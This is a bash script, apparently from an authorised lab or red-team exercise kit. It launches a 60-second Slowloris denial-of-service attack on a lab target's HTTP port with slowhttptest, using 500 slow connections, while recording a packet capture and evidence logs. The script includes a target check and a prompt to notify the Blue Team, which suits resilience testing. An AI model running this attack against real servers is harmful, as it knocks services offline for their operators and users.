#!/usr/bin/env bash
# Phase 6 — DoS Vector 1: Slowloris (agota workers HTTP con conexiones lentas)

source "$(dirname "$0")/../lib/common.sh"

validate_target "${LAB_TARGET}"
EVIDENCE_DIR=$(cat /tmp/dos-evidence-dir 2>/dev/null || { echo "[ERROR] Run 00-baseline.sh first" >&2; exit 1; })
banner "DoS Vector 1 — Slowloris"

PORT="${1:-80}"

log INFO "Starting Slowloris against ${LAB_TARGET}:${PORT} for 60s"
log WARN "Notify Blue Team NOW. Press Enter to start, Ctrl+C to abort."
read -r

# Captura pcap local del ataque
tcpdump -i any -w "${EVIDENCE_DIR}/slowloris.pcap" \
    "host ${LAB_TARGET} and port ${PORT}" &
TCPDUMP_PID=$!

START=$(date +%s)
slowhttptest \
    -c 500 \
    -H \
    -i 10 \
    -r 200 \
    -t GET \
    -u "http://${LAB_TARGET}:${PORT}/" \
    -x 24 \
    -p 3 \
    -l 60 \
    -g \
    -o "${EVIDENCE_DIR}/slowloris-report" \
    2>&1 | tee "${EVIDENCE_DIR}/slowloris.log"
END=$(date +%s)

kill "$TCPDUMP_PID" 2>/dev/null || true

log INFO "Vector 1 finished. Duration: $((END-START))s"
log INFO "Evidence: slowloris-report.html, slowloris.pcap, slowloris.log"
